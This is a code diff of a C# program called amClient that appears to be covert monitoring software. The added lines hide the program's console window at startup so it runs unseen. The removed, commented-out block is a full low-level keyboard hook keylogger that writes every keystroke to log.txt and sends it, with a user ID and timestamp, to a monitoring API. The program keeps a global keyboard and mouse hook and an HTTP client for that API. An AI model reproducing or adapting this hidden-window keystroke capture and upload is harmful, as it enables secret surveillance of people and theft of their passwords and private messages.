@@ -4,15 +4,33 @@ using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
 
 namespace amClient
 {
     class Program
     {
+        [DllImport("user32.dll")]
+        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
         private static IKeyboardMouseEvents m_Events;
 
         public static void Main()
         {
+            //Console.Title = "Testing";
+            Console.Title = "amMiddle Start";
+
+            IntPtr hWnd = FindWindow(null, "amMiddle Start");
+
+            if (hWnd != IntPtr.Zero)
+            {
+                //Hide the window
+                ShowWindow(hWnd, 0); // 0 = SW_HIDE
+            }
+
             //API
             RunAsync().Wait();
 
@@ -118,96 +136,13 @@ namespace amClient
             //textBoxLog.AppendText(text);
             //textBoxLog.ScrollToCaret();
         }
-
-        #region Comment Just for Cause
-
-        //#region KeyLogger
-
-        //private const int WH_KEYBOARD_LL = 13;
-        //private const int WM_KEYDOWN = 0x0100;
-        //private static LowLevelKeyboardProc _proc = HookCallback;
-        //private static IntPtr _hookID = IntPtr.Zero;
-        //const int SW_HIDE = 0;
-
-        //private static IntPtr SetHook(LowLevelKeyboardProc proc)
-        //{
-        //    using (Process curProcess = Process.GetCurrentProcess())
-        //    using (ProcessModule curModule = curProcess.MainModule)
-        //    {
-        //        return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-        //            GetModuleHandle(curModule.ModuleName), 0);
-        //    }
-        //}
-
-        //private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-        //private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
-        //{
-        //    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
-        //    {
-        //        int vkCode = Marshal.ReadInt32(lParam);
-        //        Console.WriteLine((Keys)vkCode);
-        //        StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-        //        sw.Write((Keys)vkCode);
-        //        sw.Close();
-
-        //        var monitor = new amModel();
-        //        monitor.amModelId = Guid.NewGuid().ToString();
-        //        monitor.KeyLogCatch = ((Keys)vkCode).ToString();
-        //        monitor.TimeStamp = DateTime.Now;
-        //        monitor.userID = "HWK";
-
-        //        CreateMonitoringAsync(monitor);
-        //    }
-        //    return CallNextHookEx(_hookID, nCode, wParam, lParam);
-        //}
-
-        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        //private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        //[return: MarshalAs(UnmanagedType.Bool)]
-        //private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        //private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-        //[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        //private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        //[DllImport("kernel32.dll")]
-        //static extern IntPtr GetConsoleWindow();
-
-        //[DllImport("user32.dll")]
-        //static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-        //#endregion
-
-        //public static void Main()
-        //{
-        //    var handle = GetConsoleWindow();
-
-        //    //API
-        //    RunAsync().Wait();
-
-        //    // Hide
-        //    ShowWindow(handle, SW_HIDE);
-
-        //    _hookID = SetHook(_proc);
-
-        //    Application.Run();
-
-        //    UnhookWindowsHookEx(_hookID);
-        //}
-
-        #endregion
-
+        
         static HttpClient client = new HttpClient();
 
         static async Task RunAsync()
         {
             // New code:
-            client.BaseAddress = new Uri("http://localhost:59302");
+            client.BaseAddress = new Uri("http://localhost:4988");
             client.DefaultRequestHeaders.Accept.Clear();
             client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
         }
